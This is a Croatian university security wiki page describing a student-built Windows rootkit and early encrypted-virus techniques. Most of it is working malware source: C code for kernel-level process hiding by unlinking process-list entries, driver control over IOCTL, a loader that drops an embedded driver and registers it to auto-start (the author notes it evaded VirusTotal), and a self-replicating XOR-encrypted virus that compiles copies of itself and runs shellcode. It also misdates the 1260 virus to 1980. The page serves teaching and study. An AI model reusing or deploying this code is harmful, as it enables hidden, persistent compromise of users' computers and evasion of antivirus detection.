</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Frane.jakelic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Frane.jakelic (stranica ne postoji)">Frane Jakelić</a> 11:15, 4. siječnja 2012. (CET)
</p>
<h2> <span class="mw-headline" id="Octopus_Rootkit">Octopus Rootkit</span></h2>
<p>Rootkit koji je nastao kao produkt ovog rada se sastoji od dva djela korisničkog i sistemskog djela i loadera rootkita na računalo, sistemski dio može raditi neovisno o korisničkom, koji je njegova nadopuna.
</p><p>Repozitorij se nalazi na <a href="https://bitbucket.org/SISProjekt/sis-malware" class="external text" rel="nofollow">bitbucket-u</a>.
</p><p><b>Sistemski dio predstavlja windows driver koji napadaču omogućava:</b>
</p>
<ul><li> Skrivanje procesa
</li><li> Pokretanje aplikacija iz jezgre računala
</li><li> Automatsko pokretanje malicioznog sadržaja prilikom startanja windowsa.
</li></ul>
<p><b>Korisnički dio:</b>
</p>
<ul><li> Ostvaruju dvosmjernu komunikaciju između korisničke aplikacije i drivera
</li><li> Definiranje programa koji se trebaju pokrenuti ili sakriti
</li></ul>
<p><b>Loader:</b>
</p>
<ul><li> Stvaranje drivera iz BLOB-a koji je spremljen u aplikaciji
</li><li> Instaliranje drivera na računalo
</li><li> Definiranje postavki drivera
</li></ul>
<p>Svaki od djelova rootkit-a će biti detaljnije pojašnjen u daljnjem tekstu. 
</p>
<h3> <span class="mw-headline" id="Sistemski_dio_rootkita_.28Driver.29">Sistemski dio rootkita (Driver)</span></h3>
<p>Sistemski dio rootkita je izrađen kao driver na windows operacijskom sustavu, ova metoda je izabrana kako bi napadač imao najviše privilegije prilikom pokretanja rootkita i drugih malicioznih aplikacija koje planira dodati na zaraženo računalo. Prvidio na rasporedu opisa sistemskog djela dolazi skrivanje aktivnih procesa uz pomoć DKOM metode.
</p>
<h4> <span class="mw-headline" id="DKOM_.28Direct_kernel_object_manipulation.29">DKOM (Direct kernel object manipulation)</span></h4>
<p>DKOM<a href="http://fluxius.handgrep.se/2011/01/02/ring-0f-fire-rootkits-and-dkom/" class="external autonumber" rel="nofollow">[13]</a> se koristi za pristupanje jezgrinoj memeoriji i promjenom objekata koji se nalaze unutar jezgre. Objekti koji se nalaze unutar jezgrine memorije paze na aktivne procese, dretve, trenutno otvorene portove i na mnoge druge informacije o trenutnom sustavu. Svi ti objekti su podložni promjeni od strane napadača, i napadač je u mogućnosti sakriti većinu svojih radnji. Skrivanje samih radnji se izvodi na način da se ti interni zapisi u memoriji jezgre editiraju da ne prikazuju maliciozni sadržaj.
</p><p>DKOM metoda je vrijedan alat za izradu rootkitova ali nije savršena, metoda je dosta fragilna i ovisi o velikom broju faktora prilikom izvođenja koda unutar jezgre.  Kako se prilikom izdavanja novih verzija Windows operacijskih sustava često mijenjaju pozicije i adrese internih funkcija koje su neophodne za DKOM metodu  time se stvara i potreba za izradom novijih verzija rootkita koji će moći nadiči te probleme.
</p>
<h4> <span class="mw-headline" id="Skrivanje_procesa">Skrivanje procesa</span></h4>
<p>Prilikom navođenja DKOM metode spomenuto je da postoji objekt u jezgrinoj memoriji  koji pazi na trenutne procese.  Taj objekt je dvostruko vezana lista koja prati sve aktivne procese i omogućava aplikacijama na korisničkoj razini da saznaju koji su trenutno aktivni procesi na računalu. Ova lista procesa nam je posebno zanimljiva jer promjenama nad njom možemo sakriti naš maliciozni proces koji se izvodi u pozadini operacijskog sustava.
</p><p>Skrivanje procesa se izvodi na način da se unutar dvostruko vezane liste pronađe proces koji odgovara predefiniranom stringu, i prilikom pronalaska tog procesa taj proces se  „izdvoji“ iz te liste.
</p><p>U daljnjem tekstu je prikazana implementacija DKOM metode skrivanja procesa u C programskom jeziku. Kao što možemo vidjeti iz programskog djela koda, da se prvo pretražuje proces i prilikom njegovog pronalaska preusmjeravaju se veze prijašnjeg i sljedećeg elementa u listi da zaobiđu naš maliciozni proces.
</p>
<pre>   <b>_Eprocess<a href="http://computer.forensikblog.de/en/2007/01/eprocess_6_0_6000_16386.html" class="external autonumber" rel="nofollow">[14]</a> Struktura za Windows XP:</b>
   +0x000 Pcb               &#160;: _KPROCESS
   +0x084 UniqueProcessId   &#160;: Ptr32 Void
   <b>+0x088 ActiveProcessLinks&#160;: _LIST_ENTRY</b>
   +0x090 QuotaUsage        &#160;: [3] Uint4B
   ...
   <b>+0x174 ImageFileName     &#160;: [16] UChar</b>
   ... 
</pre>
<pre>
void skrivanjeProcesa(char *naziv, int duljina,int OS){
  PEPROCESS procesZaSkrivanje;
  PLIST_ENTRY elementZaSkrivanje;
 /*
 Prvo se izvodi OS probing kako bi driver znao koji pomak mora
 koristiti prilikom kretanja po listi koja sadrži popis aktivnih procesa
 */
  switch(OS){
	case 5:{ //Windows XP
		pomak=0x088;
		glava=0x174;
		break;
	}
	case 6:{ //Windows Vista
		pomak=0x0A0;
		glava=0x14c;
		break;
	}
	case 7:{ // Windows 7
		pomak=0x0B8;
		glava=0x16c;
		break;
	}
  }
  
  if (!(procesZaSkrivanje = (PEPROCESS) pretraziPoImenu(naziv, duljina) ) ) return 0;

  elementZaSkrivanje = (PLIST_ENTRY)((PUCHAR) procesZaSkrivanje + pomak); 

 /*
 Izvršava se preusmjeravanje liste da zaobiđe naš željeni proces i nakon toga 
 se naš proces preusmjerava na samog sebe kako ne bi došlo do problema u 
 izvođenju proces i samog rušenja sustava.
 */
  *((PDWORD) elementZaSkrivanje-&gt;Blink) = (DWORD) elementZaSkrivanje-&gt;Flink;
  *((PDWORD) (elementZaSkrivanje-&gt;Flink)+1) = (DWORD) elementZaSkrivanje-&gt;Blink;
  elementZaSkrivanje-&gt;Blink = (PLIST_ENTRY)&amp;elementZaSkrivanje-&gt;Flink;
  elementZaSkrivanje-&gt;Flink = (PLIST_ENTRY)&amp;elementZaSkrivanje-&gt;Flink;
}

ULONG pretraziPoImenu(char *naziv, int duljina){
  PEPROCESS PocetniProces, TrenutniProces;
  PLIST_ENTRY elementListe;

  PocetniProces = IoGetCurrentProcess();//Kazaljka se pozicionira na trenutni process
  TrenutniProces = PocetniProces;

  do{
  /*
  Provjerava se da li trenutni proces koji se pregledava odgovara našem procesu koji 
  želimo skriti. Na adresi 0x174(win xp) se nalazi element ImageFileName koji sadrži 
  char array koji u sebi sadrži ime procesa u listi.
   */
    if (!strncmp(naziv, ((PUCHAR) TrenutniProces + glava), duljina))return TrenutniProces;
        //pomak pomiče kazaljku do pokazivača na sljedeći element liste
	elementListe = (PLIST_ENTRY)((PUCHAR)TrenutniProces + pomak);
	TrenutniProces = (PEPROCESS)elementListe-&gt;Flink;
        //negativni pomak nas vraća na deskriptor procesa.
	TrenutniProces = (PEPROCESS)((PUCHAR)TrenutniProces - pomak); 
  } while (PocetniProces&#160;!= TrenutniProces);

  return 0;
} 
</pre>
 <ul class="gallery" style="max-width: 886px;_width: 886px;">
		<li class="gallerybox" style="width: 435px"><div style="width: 435px">
			<div class="thumb" style="width: 430px;"><div style="margin:15px auto;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Before.jpg" class="image"><img alt="" src="../../images/7/7e/Before.jpg" width="398" height="350" /></a></div></div>
			<div class="gallerytext">
<p>Stanje prije izdvajanja procesa iz liste<a href="http://knol.google.com/k/-/-/l8d8pk6zlczd/m43rbo/4.jpg" class="external autonumber" rel="nofollow">[1]</a>
</p>
			</div>
		</div></li>
		<li class="gallerybox" style="width: 435px"><div style="width: 435px">
			<div class="thumb" style="width: 430px;"><div style="margin:15px auto;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:After.jpg" class="image"><img alt="" src="../../images/1/12/After.jpg" width="393" height="350" /></a></div></div>
			<div class="gallerytext">
<p>Stanje nakon izdvajanja iz liste<a href="http://knol.google.com/k/-/-/l8d8pk6zlczd/m43rbo/5.jpg" class="external autonumber" rel="nofollow">[2]</a>
</p>
			</div>
		</div></li>
</ul>
<h4> <span class="mw-headline" id="Pokretanje_aplikacije_iz_jezgre_ra.C4.8Dunala">Pokretanje aplikacije iz jezgre računala</span></h4>
<p>Još jedna od neizostavnih funkcija kernel-based rootkita je pokretanje aplikacija u korisničkom načinu rada. 
</p><p>Na prvu ruku bi se činilo da pokretanje korisničke aplikacije iz jezgre ne bi trebalo raditi  velike probleme, ali taj smjer je možda i mnogo složeniji od suprotnog smjera.
</p><p>Sami ti problemi nastaju iz razloga jer iz korisničkog u sustavski način rada postoje poviše spomenuti gateway-i koji omogćavaju komunikaciju i oni su podložni eksploatiranju.
</p><p>Prilikom isktraživanja ove metode pronađeno je mnogo materijala koji govore da kernel execute (na Windowsima) je veoma zahtjevan pothvat.
</p><p><b>Metoda radi na sljedećem principu:</b>
</p>
<ul><li>Pronalazi se željeni proces u _EPROCESS strukturi (u našem slučaju explorer.exe koji nam omogućava kreiranje dretve koja će se izvršiti u korisničkom načinu rada)
</li><li>Nakon što je pronađena dretva koja nam omogućava pokretanje aplikacije u korisničkom načinu rada pokreće se assembler kod
</li><li>Assembler kod pronalazi kernell32.dll koji dinamički izvodi u radnoj memoriji
</li><li>U krenel32.dll-u se nalaze funkcije zwCreateProcess<a href="http://www.osronline.com/showThread.cfm?link=35916" class="external autonumber" rel="nofollow">[15]</a> koja nam omogućava pokretanje procesa u korisničkom načinu rada
</li><li>Nakon što su pronađen je željene funkcije alocira se potreban prostoru u memeoriji za APC (<a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms681951(v=vs.85).aspx" class="external text" rel="nofollow">Asynchronous Procedure Calls</a>)
</li><li>APC koristimo kako bi mogli prosljediti taj poziv i uspjeli izvršiti samu funkciju unutar korisničkog načina
</li></ul>
<h4> <span class="mw-headline" id="Automatsko_pokretanje_malicioznog_sadr.C5.BEaja_prilikom_startanja_Windowsa">Automatsko pokretanje malicioznog sadržaja prilikom startanja Windowsa</span></h4>
<p>Kako se driver instalira na računalo kao service onda se njemu može definirati da se automatski pokreče prilikom startanja Windowsa. Samim time se omogućava da korisnik unutar koda definira korisnički program koji će se pokretati uz pomoć metode kernel execute koja je opisana u prošlom paragrafu. 
</p><p>Ova metoda donosi poboljšanja u metodama izrade rootkita jer maliciozni kod koji se izvodi u pozadni može biti skriven tijekom izvođenja ali također on će biti skriven među autostart programima Windowsa. Samo pojavljivanje nepoznatog korisničkog programa u windows autostartu mnogim korisnicima je odavalo znakove maliciozne radnje.
</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Frane.jakelic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Frane.jakelic (stranica ne postoji)">Frane Jakelić</a> 11:15, 4. siječnja 2012. (CET)
</p>
<h3> <span class="mw-headline" id="Korisni.C4.8Dki_dio">Korisnički dio</span></h3>
<p>Korisnički dio rootkita se odnosi na ostvarivanje komunikacije između korisničkog i sistemskog načina rada. Koristi se kako bi se mogle zadavati naredbe rootkitu iz korisničkog načina, u ovom primjeru ćemo se bazirati na komunikacijski kanala koji omogućava korisniku da pokrene ili sakrije određeni proces.
</p><p>Kasnije moguće nadogradnje na korisnički dio aplikacije je dodavanje backdoora koji bi ostvariva socket komunikaciju između dvaju računala preko interneta i time omogućio remote upravljanje rootkitom dok je upravljanje trenutno samo lokalno.
</p>
<h4> <span class="mw-headline" id="Ostvarivanje_dvosmjerne_komunikacije_izme.C4.91u_korisni.C4.8Dke_aplikacije_i_drivera">Ostvarivanje dvosmjerne komunikacije između korisničke aplikacije i drivera</span></h4>
<p>Dvosmjerna komunikacija se izvodi pomoću Device Input and Output Control (<a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa363219(v=vs.85).aspx" class="external text" rel="nofollow">IOCTL</a>) funkcija koje su omogućene u Windows driverima.
</p><p>Na sljedećem programskom kodu će ta komunikacija biti detaljnije pojašnjena.
</p><p><i><b>Korisnički dio komunikacije:</b></i>
</p>
<pre>
 /*
 Definiraju se nazivi kanala preko kojih će se slati poruke, naziv kanala je bitan kako bi driver
 mogao razlučiti kako treba upotrijebiti dobivene podatke.
 */
 #define IOCTL_PROCESSHIDE\
    CTL_CODE( SIOCTL_TYPE, 0x801, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)
 #define IOCTL_OSPROBE\
    CTL_CODE( SIOCTL_TYPE, 0x800, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)

 int osProbe();
 int osProbe(){
        /*
        Prvo se izvršava os probe na korisničkoj strani kako bi se driveru mogli poslati podaci
        na kojem operacijskom se nalazi rootkit kako bi rootkit znao koje memorijske pomake mora
        koristiti. Znaći samo se podatak o OS šalje preko komunikacijskog kanala rootkitu.
        */
	OSVERSIONINFOEX osvi;
		osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
		if (GetVersionEx((OSVERSIONINFO *) &amp;osvi)){

			if( osvi.dwMajorVersion == 6 &amp;&amp; osvi.dwMinorVersion == 0 ){
				if( osvi.wProductType == VER_NT_WORKSTATION )return 6;
				else printf(&quot;Windows server 2008&quot;);
			}else if(osvi.dwMajorVersion == 6 &amp;&amp; osvi.dwMinorVersion == 1){
				if( osvi.wProductType == VER_NT_WORKSTATION )return 7;
				else printf(&quot;Windows Server 2008 R2 &quot; );
			}else if(osvi.dwMajorVersion == 5 &amp;&amp; osvi.dwMinorVersion == 1){
			return 5;}
		}
		return 0;
 }
 int __cdecl main(int argc, char* argv[])
 {
    HANDLE hDevice;
    DWORD NombreByte;
    char out[50];
    char OS[1];
    ZeroMemory(out,sizeof(out));
    /*
    Otvara se hardware-ski drive kako bi se mogla ostavariti komunikacija. Jer prilikom izrade
    drivera bilo bi besmisleno da dravire može slati i primati podate ako nema fizičku IO jedinicu
    stoga mi kreiramo imaginarni drive koji će nam koristiti kako odskočna daska za izvršavanje
    komunikacije između korisničkog programa i drivera
    */
    hDevice =  CreateFile(&quot;\\\\.\\rootkit&quot;,
                         GENERIC_WRITE|GENERIC_READ,
                         0,
                         NULL,
                         OPEN_EXISTING,
                         FILE_ATTRIBUTE_NORMAL,
                         NULL);
    itoa(osProbe(),OS,10);
	if (argc &gt; 1){
          /*
          Definira se IO kontrola između drivera i korisnićke aplikacije, označavamo po kojem
          kanalu šaljemo podatke i input i output buffer koji se koriste kako bi se razmjenili
          podaci.
          */
          DeviceIoControl(hDevice,IOCTL_OSPROBE,
                        OS,
                        strlen(OS),
                        out,
                        sizeof(out),
                        &amp;NombreByte,
                        NULL);

	  DeviceIoControl(hDevice,
                        IOCTL_PROCESSHIDE,
                        argv[1],
                        strlen(argv[1]),
                        out,
                        sizeof(out),
                        &amp;NombreByte,
                        NULL);
	    }else{
	        printf(&quot;Proces za skrivanje nije definiran!&quot;);
	    }

    CloseHandle(hDevice);
    return 0;
 }
</pre>
<p><i><b>Sustavski dio komunikacije:</b></i>
</p>
<pre>
NTSTATUS IoControlFunction(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp){
  PIO_STACK_LOCATION IrpSl;
  ULONG CtlCode;
  PVOID pBuf = Irp-&gt;AssociatedIrp.SystemBuffer;//dohvaćaju se podaci s input buffer
  IrpSl = IoGetCurrentIrpStackLocation(Irp);
  CtlCode = IrpSl-&gt;Parameters.DeviceIoControl.IoControlCode;//dohvaća se ime kanala 
  /*
  Na temlju imena kanala izvršavaju se funkcije također je moguće i odgovoriti iz drivera
  ali za trenutnu implementaciju to nije potrebno.
  */
  if(CtlCode == IOCTL_PROCESSHIDE){
	   DbgPrint(&quot;DEBUG: Skriva se proces:&#160;%s&quot;,pBuf);
	   skrivanjeProcesa(pBuf, IrpSl-&gt;Parameters.DeviceIoControl.InputBufferLength,OS);
	   RtlZeroMemory(pBuf,IrpSl-&gt;Parameters.DeviceIoControl.InputBufferLength);
  }
  if(CtlCode == IOCTL_OSPROBE){
	OS=atoi(pBuf);
	}

</pre>
<h4> <span class="mw-headline" id="Definiranje_programa_koji_se_trebaju_pokrenuti_ili_skriti">Definiranje programa koji se trebaju pokrenuti ili skriti</span></h4>
<p>Iz prijašnjeg koda relevantan nam je samo maleni snippet koda koji nam omogićava definiranje programa koji treba skriti/pokrenuti.
</p>
<pre>
	  DeviceIoControl(hDevice,
                        IOCTL_PROCESSHIDE,
                        argv[1],
                        strlen(argv[1]),
                        out,
                        sizeof(out),
                        &amp;NombreByte,
                        NULL);
</pre>
<p>Ovaj dio kod prihvača argument preko komandne linije i prosljeđuje ga driveru. Driver zna koji postupak treba izvršiti po kanalu preko kojeg je naziv aplikacije poslan u našem primjeru IOCTL_PROCESSHIDE. IOCTL_PROCESSHIDE je kanal za skrivanje procesa, naziv je korisnički definiran.
</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Frane.jakelic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Frane.jakelic (stranica ne postoji)">Frane Jakelić</a> 11:15, 4. siječnja 2012. (CET)
</p>
<h3> <span class="mw-headline" id="Loader">Loader</span></h3>
<p>Funkcija loadera je da postavi rootkit na računalo te da definira početne postavke, koji programi će biti skriveni a koje aplikacije će se pokretati. I također loader se brine da postavi driver na automatsko pokretanje prilikom pokretana Windowsa ili da bude triggeran nekim određenim događajem.
</p>
<h4> <span class="mw-headline" id="Stvaranje_drivera_iz_BLOB-a_koji_je_spremljen_u_aplikaciji">Stvaranje drivera iz BLOB-a koji je spremljen u aplikaciji</span></h4>
<p>U prvoj verziji rootkit je bio deployan pomoću nekih postojećih rješenja, ali kako je većina tih rješenja prepoznata od strane antivirusnih kompanije izrađeno je privremeno rješenje. To rješenje je da se binarni zapis drivera koji se treba insalirati na računalo zapakira unutar hex koda i da se prilikom izvršenja loadera binarno zapiše u datoteku i pokrene. Prilikom testiranja ove metode na stranicama kao virustotal nije bilo nikakvih upozorena na maliciozni sadržaj.
</p><p><i><b>Kreiranje driver sys datoteke na "žrtvinom" računalu</b></i>
</p>
<pre>
void createSys()
{
    FILE *myfile = fopen(&quot;rootkit.sys&quot;, &quot;wb&quot;);

    unsigned char rootkit_sys[] = {
        /*      0 */  0x4d,0x5a,0x90,0x00,0x03,0x00,0x00,0x00, /* MZ...... */
        /*      8 */  0x04,0x00,0x00,0x00,0xff,0xff,0x00,0x00, /* ........ */
        /*     16 */  0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00, /* ........ */
        /*     24 */  0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00, /* @....... */
        /*     32 */  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, /* ........ */
        /*     40 */  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, /* ........ */
        /*     48 */  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, /* ........ */ 
                                   . . .
        /*   3432 */  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, /* ........ */
        /*   3440 */  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, /* ........ */
        /*   3448 */  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00  /* ........ */
    }; 

    int rootkit_sys_len = 3456;

    fwrite(rootkit_sys, rootkit_sys_len, 1,myfile);

</pre>
<h4> <span class="mw-headline" id="Pode.C5.A1avanje_i_instaliranje_drivera_na_ra.C4.8Dunalo">Podešavanje i instaliranje drivera na računalo</span></h4>
<p>Ovaj programski kod prikazuje definiranje početnih postavki drivera i otvaranje manager koji omogućava registriranje drivera na računalu.
</p>
<pre>
        char aPath[1024];
	char aCurrentDirectory[515];
	SC_HANDLE sh = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	GetCurrentDirectory(512, aCurrentDirectory);
	_snprintf(aPath,1022,&quot;%s\\%s.sys&quot;,aCurrentDirectory,theDriverName);
        SC_HANDLE rh = CreateService(sh, 
                       theDriverName,
                       theDriverName,
                       SERVICE_ALL_ACCESS,
                       SERVICE_KERNEL_DRIVER,
                       SERVICE_AUTO_START, 
                       /*
                       SERVICE_AUTO_START
                       možda najbitnija zastavica koja našem rootkitu omogućava
                       automatsko startanje prilikom startanja windowsa. 
                       */   
                       SERVICE_ERROR_NORMAL,
                       aPath,
                       NULL,
                       NULL,
                       NULL,
                       NULL,
                       NULL);
 
         rh = OpenService(sh,theDriverName,SERVICE_ALL_ACCESS);
</pre>
<p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Frane.jakelic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Frane.jakelic (stranica ne postoji)">Frane Jakelić</a> 11:15, 4. siječnja 2012. (CET)
</p>
<h2> <span class="mw-headline" id="Napredne_metode_evolucije_malwarea">Napredne metode evolucije malwarea</span></h2>
<p>Popularizacijom profesionalnih antivirusnih aplikacija, autori malwarea shvatili su da se ne isplati raditi viruse sa statičnim kodom jer im se vrlo lako izuzme potpis (dio koda karakterističan za neki virus), pa ih je stoga relativno lako zaustaviti čim se prvi put virus otkrije "u divljini". Neki autori malwarea su pokušali zaobići ovaj problem napadanjem samih antivirusnih programa, no naprednije rješenje je bilo promijeniti sam kod na način da uvijek bude neprepoznatljiv.
</p>
<h4> <span class="mw-headline" id="Enkriptiranje">Enkriptiranje</span></h4>
<div class="thumb tright"><div class="thumbinner" style="width:429px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Enkript.png" class="image"><img alt="" src="../../images/thumb/1/1e/Enkript.png/427px-Enkript.png" width="427" height="152" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Enkript.png" class="internal" title="Povećaj"><img src="../../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div>Prikaz statičkog i varijabilnog dijela enkriptiranog virusa kroz četiri generacije (dijelovi iste boje se ne mijenjaju). Tijelo virusa je u svakoj generaciji drukčije jer se enkriptira različitim ključem. Međutim, nakon dekripcije cijeli kod je dostupan.</div></div></div>
<p>Osamdesetih godina prošlog stoljeća, virus Cascade, namijenjen DOS operacijskom sustavu, bio je prvi virus koji je sadržavao enkriptirano tijelo i glavu za dekripciju. Ideja autora je bila da se u svakoj generaciji virusa tijelo virusa enkriptira sa različitim ključem (na ovaj način je problematično napraviti potpis virusa), a statični dio je bio kratki segment koji bi dekriptirao kod i pokrenuo ga. Pri širenju, virus bi svojem potomku zapisao novi kod (enkriptiran) te ključ s kojim će potomak dekriptirati svoj kod. Strogo gledano, ovakav malware bi bilo preciznije zvati "kodiran" a ne "enkriptiran", jer ključ za dekripciju mora biti zapisan u kodu (stoga je dekripcija u pravilu trivijalna jednom kad se virus otkrije i analizira).
</p><p>Jednostavan primjer takvog virusa funkcionira na sljedeći način:
</p>
<ol><li> Pronađi varijablu ključ i string "source kod"
</li><li> Dekriptiraj po ključu source kod iz enkriptiranog stringa "source kod"
</li><li> Generiraj novi ključ za dijete
</li><li> Enkriptiraj source kod s novim ključem i zapiši ga u dijete u string "source kod"
</li><li> Zapiši u dijete plaintekst verziju source koda
</li><li> Zapiši u dijete novi ključ (s kojim će ono dekriptirati svoj string)
</li><li> Kad je zadovoljen neki uvjet: pokreni payload
</li><li> Pokreni dijete virus
</li><li> Izbriši sebe
</li></ol>
<p>Sljedeći c++ kod prikazuje implementaciju jednostavnog enkriptiranog virusa čiji payload je Windows shellcode (u ovom primjeru je korišten shellcode koji na svim verzijama Windowsa otvori messagebox sa tekstom "foi!"):
</p>
<pre>
// ključ za dekripciju, u prvoj iteraciji je nula, da bi kod bio čitljiv
unsigned int key=0;

// shellcode izvrsava asm komande; ovaj primjer otvara messagebox koji kaže &quot;foi!&quot;; ukupno 238 charova
char *shellcode = &quot;\xfc\x33\xd2\xb2\x30\x64\xff\x32\x5a\x8b\x52  ... \\ ...  \x24\x40\xff\x54\x24\x40\x57\xff\xd0&quot;;

// slijedi sadržaj kompletnog programa:
// (u prvoj iteraciji algoritma gornji string je plaintext, u kasnijim generacijama je enkriptiran)
char *code = &quot;typedef __SIZE_TYPE__ size_t;  ... \\ ...  shellcodechar[i] = (shellcode[i]^key) &amp; 0x00FF; } ((void (*)())shellcodechar)(); return 0;}&quot;;

// pošto je cilj smanjiti program, nema includeova, ali onda bi nedostajalo sljedeće iz stdio.h:
typedef __SIZE_TYPE__ size_t; // definicije potrebne za char i time
typedef __WCHAR_TYPE__ wchar_t;

typedef struct _iobuf{ // struct FILE
   char* _ptr; 
   int _cnt; 
   char* _base; 
   int _flag; 
   int _file; 
   int _charbuf; 
   int _bufsiz; 
   char* _tmpfname;
}FILE; 
// stdio.h kraj

char* cryptchar(char l, unsigned int key){ 
   // (de)kriptira char po char, kompletan *char array odjednom ide dosta buggovito
   // pretvara char u format \x00, gdje je 00 = hex vrijednost iz asciija
   char *fin;
   fin = (char*)malloc(5*sizeof(char));
   fin[0]='\\';
   fin[1]='x';
   
   int c1=(int)((l^key) &amp; 0x00F0)/16; // /16 jer je prva znamenka u bazi hexa
   int c2=(int)((l^key) &amp; 0x000F);
   if(c1&lt;=9){
      fin[2]=(char)(48+c1);
   }else if(c1&lt;=15){
      fin[2]=(char)(65-10+c1);
   }
   if(c2&lt;=9){
      fin[3]=(char)(48+c2);
   }else if(c1&lt;=15){
      fin[3]=(char)(65-10+c2);
   }
   fin[4]='\0';
   return fin;
}

int main(){
   int i;
   FILE *pfile;
   srand(time(((void *)0))); // ((void*)0) = NULL

   // template za filename; .c ako će se kompajlirati, .exe ako će se izravno kreirati binary
   char filename[12] = {'1','2','3','4','5','6','7','8','.','c','\0'};

   // randomizira filename u nesto tipa AB12CD3E
   for(i=0;i&lt;8;i++) filename[i] = mod(rand(),3)?(char)(65+mod(rand(),26)):(char)(48+mod(rand(),10));
   
   // mora se prosljedjivati const char u fopen
   const char *fname = filename;

   pfile = (FILE*)fopen(fname, &quot;w&quot;);

   // sljedećem bloku koda zapisuje u datoteku novi ključ i novi enkriptirani kod
   fprintf(pfile, &quot;unsigned int key=&quot;);
   int nkey = mod(rand(),100);
   printf(&quot;Novi kljuc:&#160;%d\n&quot;, nkey);
   char nks[3];
   nks[0]=(char)(48+nkey/10);
   nks[1]=(char)(48+mod(nkey,10));
   nks[2]='\0';
   fprintf(pfile, nks);
   fprintf(pfile, &quot;;\nchar *shellcode=\&quot;&quot;);
   for(i=0;i&lt;238;i++){
      fprintf(pfile, cryptchar(shellcode[i],key^nkey));
   }
   fprintf(pfile, &quot;\&quot;;\nchar *code=\&quot;&quot;);
   for(i=0;i&lt;1768;i++){
      fprintf(pfile, cryptchar(code[i],key^nkey));
   }
   fprintf(pfile, &quot;\&quot;;\n&quot;);
   char *decode;
   decode=(char*)malloc(1768*sizeof(char));
   for(i=0;i&lt;1768;i++){
      decode[i] = (char)((code[i]^key) &amp; 0x00FF);
   }
   fprintf(pfile, decode);
   fclose(pfile);
   // kraj zapisivanja

   // poziva se kompajler; tcc.exe konkretno ima 132 kb stoga ga je dovoljno praktično slati sa virusom
   char comm[19] = &quot;tcc.exe 12345678.c\0&quot;;
   for(i=8;i&lt;16;i++){
      comm[i]=filename[i-8];
   }
   const char *compile = comm;
   system(compile);

   // petlja dekodira bez obrade za output (za razliku od funkcije cryptchar)
   char shellcodechar[238];
   for(i=0;i&lt;238;i++){
      shellcodechar[i] = (shellcode[i]^key) &amp; 0x00FF;
   }

   // executa string, tj. pokrece shellcode
   ((void (*)())shellcodechar)();
   return 0;
}
</pre>
<p>Repliciranje se u gornjem primjeru izvodi na način da virus u dijete prvo zapiše svoj kod kao vrijednost stringa, a potom isti kod zapiše u dijete kao instrukcije za izvođenje. Virus može direktno zapisivati sadržaj djeteta u binarni file kojeg će pokrenuti  kao executable, ili zapisivati u obliku source koda te ga potom kompajlirati (kao u ovom primjeru, gdje se koristi kompajler od 130 kB).
</p><p>Ukoliko se koristi kompajler, to se može izvesti na nekoliko načina:
</p>
<ul><li> Traženjem kompajlera na zaraženom računalu (jednostavan postupak za linux hostove koji vrlo često imaju gcc)
</li><li> Povlačenjem kompajlera s interneta i korištenjem kao eksterne datoteke
</li><li> Generiranjem kompajlera iz samog virusa
</li><li> Ugrađivanjem funkcija kompajlera u sam virus
</li></ul>
<p>Problem detektiranja ovakvih virusa proizlazi iz činjenice da je samo malen dio koda statičan (dekriptor virusa), ali ako je tijelo virusa fiksne duljine ili je dekriptor dovoljno specifičan, detekcija putem potpisa je ipak moguća. Kod se može dodatno zakomplicirati, npr. pozicija dekriptora se može konstantno mijenjati itd., ali i ovo je moguće otkriti heurističkim tehnikama antivirusnih aplikacija. Pogotovo ukoliko se radi o jednostavnoj enkripciji (xor enkripcija), antivirusni program može sam dekriptirati tijelo (makar brute-force napadom).
</p>
<h4> <span class="mw-headline" id="Polimorfizam">Polimorfizam</span></h4>
<div class="thumb tright"><div class="thumbinner" style="width:429px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Polimorf.png" class="image"><img alt="" src="../../images/thumb/3/3b/Polimorf.png/427px-Polimorf.png" width="427" height="202" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Polimorf.png" class="internal" title="Povećaj"><img src="../../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div>Prikaz polimorfičnog virusa kroz četiri generacije. Glava virusa (dekripter) se mijenja u svakoj generaciji (iako je neizbježno da ostanu neki dijelovi koji su isti). Tijelo se enkriptirati kao i ranije.</div></div></div>Polimorfizam koda (i njegova primitivnija varijanta, oligomorfizam) je svojstvo malwarea koje pokušava mutiranjem virusa eliminirati većinu problema na koje su nailazili enkriptirani virusi. Prvi polimorfični virus, 1260 iz 1980. godine, bio je zapravo poboljšana verzija starijeg virusa Vienna, kojemu je u dekriptor dodano svojstvo randomizacije i obfuskacije. Na ovaj način, virus naizgled nije imao nikakvih statičkih dijelova jer se i enkripter (glava) sintaktički mijenja u svakoj iteraciji virusa.
